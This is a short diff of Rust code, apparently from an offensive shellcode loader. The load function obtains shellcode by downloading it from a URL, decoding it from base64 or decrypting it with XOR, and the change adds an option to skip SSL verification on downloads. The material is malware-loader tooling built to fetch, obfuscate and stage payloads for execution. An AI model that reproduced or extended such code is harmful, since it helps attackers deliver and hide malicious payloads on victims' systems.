@@ -34,11 +34,11 @@ pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
                 shellcode: decode_b64_shellcode(&sc_bytes, b64_iterations)?,
             })
         }
-        Url(url) => Ok(Injector {
-            shellcode: download_shellcode(&url)?,
+        Url(url, ignore_ssl) => Ok(Injector {
+            shellcode: download_shellcode(&url, ignore_ssl)?,
         }),
-        Base64Url((url, b64_iterations)) => {
-            let b64_shellcode: Vec<u8> = download_shellcode(&url)?;
+        Base64Url((url, ignore_ssl, b64_iterations)) => {
+            let b64_shellcode: Vec<u8> = download_shellcode(&url, ignore_ssl)?;
             Ok(Injector {
                 shellcode: decode_b64_shellcode(&b64_shellcode, b64_iterations)?,
             })
@@ -46,8 +46,8 @@ pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
         XorEmbedded((sc_bytes, key)) => Ok(Injector {
             shellcode: decrypt_xor(&sc_bytes, &key)?,
         }),
-        XorUrl((url, key)) => {
-            let sc = download_shellcode(&url)?;
+        XorUrl((url, ignore_ssl, key)) => {
+            let sc = download_shellcode(&url, ignore_ssl)?;
             Ok(Injector {
                 shellcode: decrypt_xor(&sc, &key)?,
             })
